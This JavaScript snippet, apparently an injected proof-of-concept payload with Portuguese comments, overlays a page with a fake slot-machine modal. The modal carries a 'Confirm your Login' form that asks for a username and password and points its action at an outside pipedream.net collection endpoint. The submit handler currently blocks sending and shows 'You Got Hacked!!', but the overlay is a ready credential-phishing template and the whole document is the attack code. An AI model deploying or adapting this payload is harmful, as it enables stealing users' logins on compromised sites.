

(function() {
    // Evita múltiplas execuções
    if (window.__slotMachineInjected) return;
    window.__slotMachineInjected = true;

    // CSS do modal
    var style = document.createElement('style');
    style.textContent = `
    #slotModalBg {
      position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
      background: rgba(0,0,0,0.85); z-index: 99999; display: flex; align-items: center; justify-content: center;
    }
    #slotModal {
      background: #222; color: #fff; border-radius: 10px; padding: 30px 20px; width: 340px; box-shadow: 0 0 20px #000;
      text-align: center; font-family: Arial, sans-serif;
    }
    #slotModal .aviso {
      color: #ff0; font-weight: bold; margin-bottom: 18px;
    }
    #slotModal .slot {
      font-size: 2em; margin: 18px 0;
    }
    #slotModal input {
      width: 90%; padding: 8px; margin: 8px 0; border-radius: 4px; border: none;
    }
    #slotModal button {
      padding: 10px 20px; border: none; border-radius: 4px; background: #ff9800; color: #fff; font-size: 1em; cursor: pointer;
      margin-top: 10px;
    }
    #slotModal .closeBtn {
      position: absolute; top: 12px; right: 20px; background: none; color: #fff; font-size: 1.5em; border: none; cursor: pointer;
    }
  `;
    document.head.appendChild(style);

    // HTML do modal
    var modalBg = document.createElement('div');
    modalBg.id = 'slotModalBg';
    modalBg.innerHTML = `
    <div id="slotModal">
      <button class="closeBtn" title="Fechar" onclick="document.getElementById('slotModalBg').remove()">×</button>
      <div class="aviso">⚠️⚠️</div>
      <h2>Slot Machine</h2>
      <div class="slot" id="slotFake">🍒 | 🍋 | 🍊</div>
      <button id="girarBtn">Roll</button>
      <div class="login">
        <h3>Confirm your Login</h3>
        <form id="slotLoginForm" action="https://eobx9u4gpw6vs1y.m.pipedream.net/poc" method="POST">
          <input type="text" placeholder="User/Mail" required><br>
          <input type="password" placeholder="Password" required><br>
          <button type="submit">Signin</button>
        </form>
      </div>
    </div>
  `;
    document.body.appendChild(modalBg);

    // Função de girar
    document.getElementById('girarBtn').onclick = function() {
        var simbolos = ['🍒', '🍋', '🍊', '🍉', '⭐', '🔔'];
        var resultado = [];
        for (var i = 0; i < 3; i++) {
            resultado.push(simbolos[Math.floor(Math.random() * simbolos.length)]);
        }
        document.getElementById('slotFake').textContent = resultado.join(' | ');
    };

    // Função de login fake
    document.getElementById('slotLoginForm').onsubmit = function(e) {
        e.preventDefault();
        alert('You Got Hacked!!');
    };
})();

